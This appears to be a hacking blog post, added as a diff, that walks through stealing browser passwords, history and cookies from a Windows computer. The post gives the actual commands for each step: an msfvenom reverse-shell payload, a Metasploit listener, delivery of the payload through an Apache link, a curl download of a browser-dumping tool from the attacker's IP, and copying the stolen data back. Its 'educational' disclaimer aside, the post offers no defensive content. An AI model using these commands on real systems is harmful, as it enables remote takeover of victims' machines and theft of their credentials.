@@ -1,0 +1,81 @@
+
+Hi Hackers, welcome back our new blog post, in this post we will learn How hackers Steal Your Browser Password, History, etc. also we share you complete guide how to steal browser password. and how you secure this type hacking attacks, so lets start.
+
+Note: This blog post is for educational purpose only. so that you will know how this attack is work. me  will not be responsible for whatever action you performed.
+
+
+
+
+For Cyber Forensics.
+
+with the help of this blog post, cyber forensics will be greatly helped to analyze their targets.so that they can trace the password, history, downloads of the target's browser.
+
+How To Steal Browser Password
+
+Step-1. Making Payload
+
+Firts of all you have to create a malicious application, so that you can control the target computer, here we are using Metasploit-Framework with the help of we will Create Malicious Application for Windows Machine.
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=Yoyr Ip LPORT=Your port-f exe > shell.exe
+
+
+Step-2. Run Metasploit Listener
+
+after the create payload, now you have to start the metasploit listener, so that you can connect to the target computer. Below I am giving you some commands. the commands that you have to paste after starting the metasploit so that your listener will be able to start successfully.
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost your ip
+set lport your port
+exploit
+
+
+
+Step-3. Start Apache Web server
+
+
+after starting the listener, now you have to start the apache web serve r in your Linux Machine, so that you can download your payload on the target computer through a link.
+
+service apache2 start
+
+
+
+
+Step-4. Download Payload Windows
+
+now your work is over here. now you have to download your payload (malicious App) on the target's computer through a link. and if the target computer download and execute this application, then its computer comes under your control.
+
+
+
+
+
+
+Step-5. Control Windows 10
+
+after getting meterpreter shell, now your main work start from here. now you have to collect the history and password of the browser from inside the target machine. for this you have to download an application inside the target machine. to download you follow these commands.
+curl http://yourip/browser.exe -O MY.exe
+
+
+
+Step-6. Steal All Browsers Password
+
+after your browser file is downloaded, you will now have to give a command, with the help of which the browser password, history, bookmarks from the victim's computer will be captured and started inside a file.
+
+browser.exe -b all -f json --dir results
+
+
+
+Step-7. Download File Target Computer
+
+now you have to download the captured file from the target computer to your computer, so that you can check target all browser data history on your computer.
+
+download results/ /root/pass/
+
+
+
+Conclusion
+
+
+
+
+so that's for today guys, i hope you will learn How hacker steal browser password and how to steal Cookies. so if you like this post please do comment below. and follow Linuxndroid. Thanks Bye.
